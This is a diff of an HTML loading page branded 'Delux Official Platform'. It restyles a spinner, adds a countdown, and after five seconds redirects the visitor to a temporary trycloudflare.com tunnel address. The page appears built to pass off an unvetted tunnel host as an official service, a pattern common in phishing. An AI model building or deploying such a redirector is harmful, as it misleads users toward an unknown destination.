@@ -3,37 +3,60 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Loading...</title>
+  <title>Loading Delux Platform</title>
   <style>
     body, html {
       height: 100%;
       margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0f172a;
+      color: #fff;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      background: #f7f9fc;
-      font-family: Arial, sans-serif;
     }
     .spinner {
-      border: 12px solid #e0e0e0;
-      border-top: 12px solid #1a73e8;
+      border: 10px solid #e2e8f0;
+      border-top: 10px solid #38bdf8;
       border-radius: 50%;
       width: 80px;
       height: 80px;
       animation: spin 1.2s linear infinite;
+      margin-bottom: 20px;
     }
     @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
+      to { transform: rotate(360deg); }
+    }
+    h1 {
+      font-size: 1.5em;
+      margin: 0 0 10px;
+      text-align: center;
+    }
+    .countdown {
+      margin-top: 10px;
+      font-size: 1.2em;
+      color: #94a3b8;
     }
   </style>
   <script>
-    setTimeout(() => {
-      window.location.href = "https://tracking-roughly-travelers-anti.trycloudflare.com";
-    }, 5000);
+    let seconds = 5;
+    function countdown() {
+      const el = document.getElementById('count');
+      if (seconds > 0) {
+        el.textContent = seconds + ' seconds';
+        seconds--;
+        setTimeout(countdown, 1000);
+      } else {
+        window.location.href = "https://tracking-roughly-travelers-anti.trycloudflare.com";
+      }
+    }
+    window.onload = countdown;
   </script>
 </head>
 <body>
   <div class="spinner"></div>
+  <h1>Loading Delux Official Platform...</h1>
+  <div class="countdown" id="count"></div>
 </body>
 </html>
